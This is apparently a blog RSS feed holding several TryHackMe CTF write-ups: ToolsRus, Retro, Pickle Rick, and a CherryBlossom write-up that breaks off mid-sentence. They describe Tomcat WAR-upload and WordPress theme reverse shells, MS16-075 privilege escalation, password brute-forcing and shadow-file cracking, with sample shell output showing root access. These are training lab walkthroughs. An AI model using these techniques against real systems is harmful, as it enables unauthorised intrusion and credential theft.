meterpreter &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/oKzYzmKjlPgEU" width="480" height="420" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reactiongifs-oKzYzmKjlPgEU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;and we have a shell, so technically what happened the script logged in went to &lt;strong&gt;/manager &lt;/strong&gt;and uploaded a war file and gave us an easy lazy reverse shell and not any shell a &lt;strong&gt;root&lt;/strong&gt; user shell ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: root
meterpreter &amp;gt; shell
Process 4 created.
Channel 4 created.
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
python -c 'import pty;pty.spawn("/bin/bash")'
root@ip-10-10-27-83:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-27-83:/#&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/WuGSL4LFUMQU" width="480" height="374" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/oooh-WuGSL4LFUMQU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@ip-10-10-27-83:~# ls -la /root
ls -la /root
total 40
drwx------  5 root root 4096 Mar 11  2019 .
drwxr-xr-x 23 root root 4096 Apr  3 13:34 ..
-rw-------  1 root root   47 Mar 11  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root   33 Mar 11  2019 flag.txt
drwxr-xr-x  2 root root 4096 Mar 11  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Mar 10  2019 snap
drwx------  2 root root 4096 Mar 10  2019 .ssh
-rw-------  1 root root  658 Mar 11  2019 .viminfo
root@ip-10-10-27-83:~# cat /root/flag.txt
cat /root/flag.txt
ffxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
root@ip-10-10-27-83:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and here you are a root guru and you got the flag happy with that, but make sure to focus more on the most important part, is to understand why does it work, why exactly when you ran exploit or run in that msfconsole it gave you back a reverse shell, if you are interested on reading more about this exploit, I will leave the ruby file of the exploit used in metasploit and more details on the exploit itself.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/rapid7/metasploit-framework"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;rapid7/metasploit-framework&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;rapid7&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars3.githubusercontent.com/u/1013671?s=400&amp;amp;v=4" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Apache Tomcat Manager Authenticated Upload Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Rapid7′s VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.rapid7.com/includes/img/favicon.ico" alt="ToolsRus CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;Rapid7&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.rapid7.com/globalassets/rapid7-og.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.cvedetails.com/cve/CVE-2009-3548/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;CVE-2009-3548 : The Windows installer for Apache Tomcat 6.0.0 through 6.0.20, 5.5.0 through 5.5.28, and possibly earlier versions uses a blank default password for the administrative user, which allows remote attackers to gain privileges.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.cvedetails.com/img/logo2.png" alt="ToolsRus CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Retro | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server based on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap does&lt;/p&gt;</description><link>http://localhost:2368/ghostcat-write-up/</link><guid isPermaLink="false">5e87092e8178f03c2e87f649</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 11:01:50 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/HJI.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/HJI.png" alt="Retro | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is provided by tryhackme.com and made by Darkstar7471 it is a web server based on windows, before we start enumerating the machine we have to take in consideration the note we got, which is we won't get any response for any ping request, nmap does have a flag for that &lt;strong&gt;-nP&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo nmap -Pn -sV -p- -vv &amp;lt;target-machine&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.55.36-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;After the quick scan we did on our target, we can see that it is a IIS Windows Server, port 80 is running an http server and we have port 3389 that can allow us to get a remote desktop {RDP} &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.56.26.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.08.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-12.59.36.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;So we visited the port 80, found the landing page of windows server kept digging for directories the only one that is available is &lt;strong&gt;/retro&lt;/strong&gt; or &lt;strong&gt;/Retro&lt;/strong&gt;, it doesn't matter.&lt;/p&gt;&lt;p&gt;the first thing got my eye is the User who shared the article in this site &lt;strong&gt;"Wade"&lt;/strong&gt; I clicked on the user it showed me all the articles shared by the user, it felt like a wordpress but I wanted to make sure that it is! I ran another directory scan in the directory &lt;strong&gt;/retro&lt;/strong&gt; to see if we have anything, but before that, a comment got my eye.&lt;/p&gt;&lt;p&gt;It looks like our user Wade doesn't have a very good memory so he left us a little note in a comment on one of his articles.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.00.38.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.01.50.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just like I thought, it is a wordpress! let's jump to wp-login.php and use the username we have and the note the user left just in case he forgets it, maybe its a bluff or maybe a hint for the password.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.02.35.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;well guess what it is the password for the user, the next part of the logging, I got too excited and forgot to take screenshots, so the step after I created a php reverse shell with &lt;strong&gt;msfvenom&lt;/strong&gt; and went to the theme editor in the dashboard, used the &lt;strong&gt;404.php&lt;/strong&gt; to insert my php code opened metasploit set up my settings and ran the listener and we got a shell &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.04.41.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.09.18.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/IPqbZhStIeZdS" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rainbow-nintendo-mario-IPqbZhStIeZdS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;Privilege escalation time &lt;/blockquote&gt;&lt;p&gt;It is a windows machine so i ran &lt;strong&gt;&lt;a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"&gt;Windows-Exploit-Suggester&lt;/a&gt; &lt;/strong&gt;made&lt;strong&gt; &lt;/strong&gt;by&lt;strong&gt; &lt;a href="https://github.com/AonCyberLabs"&gt;Aon's Cyber Labs&lt;/a&gt; &lt;/strong&gt;it's a very powerful python script and straight forward so I saved the systeminfo of the machine, ran the command and got all the exploits that can be used for this specific version of window server, in the command I added at the end &lt;strong&gt;-l&lt;/strong&gt; to tell our script to find local exploits, because we want &lt;strong&gt;Administrator&lt;/strong&gt; user&lt;/p&gt;&lt;pre&gt;&lt;code&gt;python windows-exploit-suggester.py --database &amp;lt;xls database  of exploits provided with the script&amp;gt; --systeminfor &amp;lt;systeminfo saved in a txt file&amp;gt; --ostext &amp;lt;Os&amp;gt; -l&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.41.27.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.36.40-1.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Let's use &lt;strong&gt;MS16-075&lt;/strong&gt;, as we can see the bug is considered a medium risk because you need to have access first to the machine and then exploit it if you want to read more about this vulnerability click &lt;strong&gt;&lt;a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-075"&gt;MS16-075&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-03-31-at-13.43.22.png" class="kg-image" alt="Retro | write-up"&gt;&lt;/figure&gt;&lt;p&gt;metasploit does have the exploit there, all you have to do is use the exploit look at the options, one of the requirements is a session in metasploit that we already have you set the number of the session, run the exploit and we have a shell running NT AUTHORITY\SYSTEM.&lt;/p&gt;&lt;p&gt;That's it for today if you have any question don't be shy getting in touch, and don't forget that what I used is the easy way to exploit this machine, feel free to explore the other ways in.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>Pickle Rick CTF | write-up</title><description>&lt;hr&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports.&lt;/p&gt;</description><link>http://localhost:2368/pickle-rick/</link><guid isPermaLink="false">5e86049fb466e53421ba6f62</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 02 Apr 2020 15:41:21 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/rick_morty.jpg" medium="image"/><content:encoded>&lt;hr&gt;&lt;img src="http://localhost:2368/content/images/2020/04/rick_morty.jpg" alt="Pickle Rick CTF | write-up"&gt;&lt;p&gt;Hello again, today we'll cover another CTF made by Tryhackme.com such a cool box I enjoyed every second of it, I hope you do and let's start our challenge with some enumeration.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9zXWAIcr6jycE" width="480" height="338" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rick-pickle-9zXWAIcr6jycE"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;blockquote&gt;nmap -sC -sV &lt;strong&gt;&amp;lt;target-machine&amp;gt;&lt;/strong&gt;&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-16.50.12-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.37.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;it looks like we don't have much to break, two ports. 22 for ssh and 80 http, So first what I usually do is give a quick check to the source code of the site in case something is hidden there, and after we have an idea about what we are dealing with, let's check for some directories&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.02.49-1.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.28.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.14.10.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;That is such a weird robots.txt file! it may be something useful for us, so we will keep it aside and it is weird that we have a username without login panel let's nikto the hell of this box&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.06.35.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.07.01.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.15.21.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after finding the login page first what I tried was the famous quote from Rick Wabbalubbadubdub!!!! and we got a command panel that connects us as the user www-data&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/l41lI4bYmcsPJX9Go" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/rickandmorty-adult-swim-rick-and-morty-l41lI4bYmcsPJX9Go"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.16.51.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;so when we &lt;strong&gt;ls -la &lt;/strong&gt;we notice that there are two files Sup3rwhatever.txt and clue.txt let's try and open them in the browser.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.31.44.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.32.22.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the first file is our first &lt;strong&gt;flag&lt;/strong&gt;, the second file tells us to look around the system, for my case I tried to get a reverse shell because that command prompt wasn't satisfying, well guess what every time you'll get a reverse one it will shutdown no matter how much you'll try so don't dig hard in that rabbit hole, and the second thing the command panel we have filters the queries and if one of them is &lt;strong&gt;cat&lt;/strong&gt;, &lt;strong&gt;head&lt;/strong&gt;, &lt;strong&gt;tail&lt;/strong&gt;, whatever ... it won't work, lucky us we still have access to &lt;strong&gt;find &lt;/strong&gt;and&lt;strong&gt; less &lt;/strong&gt;that's all we need 🙃 after digging in directories with ls -la /stuff/that/linux/have. &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-17.59.31.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;here we go we have the second ingredients for rick, later when I was trying many commands to find files and try to use any process to access the root directory, I thought about the first thing I try to priv escalate which is &lt;strong&gt;sudo -l&lt;/strong&gt; and yep we had it all in front of our eyes&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.26.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-02-at-18.03.47.png" class="kg-image" alt="Pickle Rick CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and that's it you are root and you have the third file that contains the last flag for the machine and everything is done the headaches are gone, but to be honest, it is a very cute challenge not hard at all, little bit of twists, but that's the beauty of it you better get used to it.&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;</content:encoded></item><item><title>CherryBlossom CTF | write-up</title><description>&lt;p&gt;Hello all, this is my first write-up at this page If you see anything not right or have any corrections I would be very happy getting some feedback, anyways let's start our write-up, Today we'll review a CTF challenge on &lt;a href="https://tryhackme.com/"&gt;TryHackme&lt;/a&gt; CherryBlossom. This challenge is rated hard and it focuses&lt;/p&gt;</description><link>http://localhost:2368/cherryblossom-ctf-write-up/</link><guid isPermaLink="false">5e8498785a6fba01623b5688</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Wed, 01 Apr 2020 13:42:48 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cherryCTF-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cherryCTF-1.png" alt="CherryBlossom CTF | write-up"&gt;&lt;p&gt;Hello all, this is my first write-up at this page If you see anything not right or have any corrections I would be very happy getting some feedback, anyways let's start our write-up, Today we'll review a CTF challenge on &lt;a href="https://tryhackme.com/"&gt;TryHackme&lt;/a&gt; CherryBlossom. This challenge is rated hard and it focuses on file manipulation and cryptography.&lt;/p&gt;&lt;blockquote&gt;First of all, we will start enumerating the machine&lt;/blockquote&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;nmap -sC -sV &lt;strong&gt;{target-host}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.03.30.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;we can see that there are three open ports 22 for SSH and 139-445 used by Samba, so far we have nothing except the samba, let's move on and scan the smb&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;nmap --script smb-enum-shares -vv &lt;strong&gt;{target-host}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.19.45.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and here we have something, an Anonymous file shared which means we can dig in with anonymous account and we may find something interesting.&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;smbclient \\&lt;strong&gt;{target-host}&lt;/strong&gt;\Anonymous&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;p&gt;we found a text file &lt;strong&gt;journal.txt &lt;/strong&gt;and when we open it, it contains a huge base64.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.19.58.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.20.49.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.21.41.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Decoding it provides us with an image, Let's save it as a png. After checking it with the command &lt;strong&gt;file&lt;/strong&gt;, it is a PNG.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-11.21.51.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Normally, in Steganography challenges Jpeg are commonly  used, Steghide won't be able to work on this PNG which means we will need to use another tool called &lt;a href="https://github.com/dhsdshdhk/stegpy"&gt;stegpy&lt;/a&gt;, It's easy to install all you have to do is &lt;strong&gt;pip3 install stegpy &lt;/strong&gt;and let's see what's hidden there&lt;/p&gt;&lt;!--kg-card-begin: markdown--&gt;&lt;p&gt;stegpy &lt;strong&gt;{file}&lt;/strong&gt;&lt;/p&gt;
&lt;!--kg-card-end: markdown--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.13.52.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.14.17.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;we got a zip file! Unluckily, it look like our file is corrupted, Let's check the hex of the file to see if something is wrong with the tag &lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.15.47.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;as it is provided in the picture it doesn't look fine, let's change it to what it's supposed to be &lt;strong&gt;50 4B 03 04&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.16.34.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.17.14.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;exit and save, it works! if you have the password 😶, Let's move on and extract that hash from the file, I will use fcrackzip to decrypt it but feel free to use whatever you like.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.20.13-1.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;after decrypting the zip file, found an Encrypted Cherrytree document, one of the good ways to store data and diaries ... , if we use the command &lt;strong&gt;file&lt;/strong&gt; to check it, it will tell us that it's a 7z file, so let's &lt;strong&gt;7z2john&lt;/strong&gt; this baby file.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.24.06.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.30.06-1.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the diaries and privacy he had is shared with us, So let's have a look at what we've got there.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.41.42.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I exported the most interesting thing he had a wordlist called cherry-bolossm 🍒 and we got a username , this is getting fun now. Let's brute force the user &lt;strong&gt;lily &lt;/strong&gt;password with the wordlist we exported from the file.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-12.53.16.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.02.25.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Welcome, Lily! 😊 what a fun way we got this user, let's not get lost now and focus on our box.&lt;/p&gt;&lt;p&gt;There's no user flag because there's another user that holds the flag and then the root! we got to pivot 😎 the username is &lt;strong&gt;Johan&lt;/strong&gt;. Let's browse on this machine.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.03.31.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the &lt;strong&gt;shadow.bak&lt;/strong&gt;  can be read by us which means we have something to get us to Mr Johan.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.04.08-2.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.06.37.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.08.38.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Et Voila, we decrypted the hash successfully and jumped from user lily to johan with the command:&lt;/p&gt;&lt;blockquote&gt;sudo -u johan&lt;/blockquote&gt;&lt;p&gt;we typed the password we got and we have the user flag, now what. We need to get root priv, the first thing I do when I'm trying to privesc &lt;strong&gt;sudo -l &lt;/strong&gt;to see if the user is allowed to use anything as root and try to gain access with the power he got.&lt;/p&gt;&lt;p&gt;when I tried to type the password we got prompted to johan, which is weird and very unusual unsafe unwhatever, all I know is that we have a &lt;strong&gt;pwdfeedback (pasword 